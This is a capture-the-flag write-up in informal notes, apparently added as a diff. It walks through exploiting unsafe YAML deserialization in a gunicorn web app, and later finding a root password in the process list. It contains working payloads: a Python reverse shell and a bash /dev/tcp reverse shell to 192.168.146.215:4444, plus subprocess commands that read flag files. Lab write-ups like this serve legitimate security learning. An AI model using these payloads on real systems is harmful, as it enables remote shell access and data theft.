@@ -1,0 +1,50 @@
+- basic nmap port scan
+-> http-server-header: gunicorn
+after some research i knew that its a Python Web Server Gateway Interface WSGI
+- open 10.112.150.122 using http 
+- got a login page 
+- checked if there is any post method using network from inspect
+- remarked a dj:dj user 
+- logged in
+- i remarked that i can import and export yaml file
+- research time:
+   search for a known vulnerability related to python and yaml which lead to an RCE 
+   because the challenge type is Boot2root
+- after some research i found: !!python/object/apply:time.sleep [10]
+  when i tested it, it sleeps for 10 then load
+=> code execution is possible
+
+reverse shell: name: !!python/object/apply:os.system ['python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.146.215\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);"']
+well reverse shell didnt work
+i used subprocess.checkoutput and it seem to work i can run all commands without error
+
+to find the first user.txt file i used ls to check /home/bartender
+# Beach Bar jukebox playlist export
+playlist:
+  name: !!python/object/apply:subprocess.check_output [['ls', '-a', '/home/bartender']]
+  vibe: !!python/object/apply:subprocess.check_output [["cat", "/home/bartender/user.txt"]]
+then i got the first flag
+
+next i tried to make a reverse shell using bash + Popen:
+# Beach Bar jukebox playlist export
+playlist:
+  # name: !!python/object/apply:subprocess.check_output [['ls', '-d', '/root']]
+  vibe: !!python/object/apply:subprocess.Popen [['/bin/bash', '-c', 'bash -i >& /dev/tcp/192.168.146.215/4444 0>&1']]
+
+and it worked
+after gaining access i tried sudo -l and it didnt work.
+next i typed: lsb_release -a -> to get the version of the current ubuntu computer
+it was: Ubuntu 24.04 Noble LTS 
+there is a well-known privilege escalation vulnerability called Copy-Fail which make a regular user become root
+this didnt work as well
+so i re-read the description and saw this "The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached."
+which indicate to jukebox file
+and i found it in /opt/beach-bar
+
+after checking on the jukeboxd.py i saw --stream-pass function so i go straight to ps aux and used grep stream (ps aux | grep stream)
+and there it is the password: SunsetSpritz2024!
+so i logged in the root: su root
+used the password.
+then ls /root -> /root/root.txt 
+=> cat root.txt
+===> FINAL FLAG  
